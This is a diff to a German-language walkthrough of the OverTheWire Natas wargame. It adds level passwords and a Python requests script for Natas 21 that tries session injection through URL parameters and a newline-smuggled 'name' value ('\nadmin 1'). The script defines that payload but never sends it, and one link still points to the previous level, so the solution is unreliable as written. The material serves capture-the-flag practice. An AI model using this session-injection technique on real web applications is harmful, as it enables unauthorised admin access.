@@ -473,10 +473,35 @@ r2 = requests.get(url, auth=(auth_user, auth_password), cookies=cookies)
 print(r2.text)
 ```
 
-
-
 # Natas 21
 
 Zugriff:	[http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)
-Username: `natas20`
+Username: `natas21`
 Passwort: `IFekPyrQXftziDEsUr3x21sYuahypdgJ  `
+
+```python
+import requests
+
+auth_user = "natas21"
+auth_password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
+url = "http://natas21-experimenter.natas.labs.overthewire.org/?debug&submit&admin=1"
+url2 = "http://natas21.natas.labs.overthewire.org/?debug&submit&admin=1"
+data = {'name':'\nadmin 1'}
+
+
+r = requests.post(url, auth=(auth_user, auth_password))
+
+for c in r.cookies:
+    session = c.value
+
+cookies = {'PHPSESSID': session}
+r2 = requests.get(url2, auth=(auth_user, auth_password), cookies=cookies)
+
+print(r2.text)
+```
+
+# Natas 22
+
+Zugriff:	[http://natas22.natas.labs.overthewire.org](http://natas22.natas.labs.overthewire.org)
+Username: `natas22`
+Passwort: `chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ`
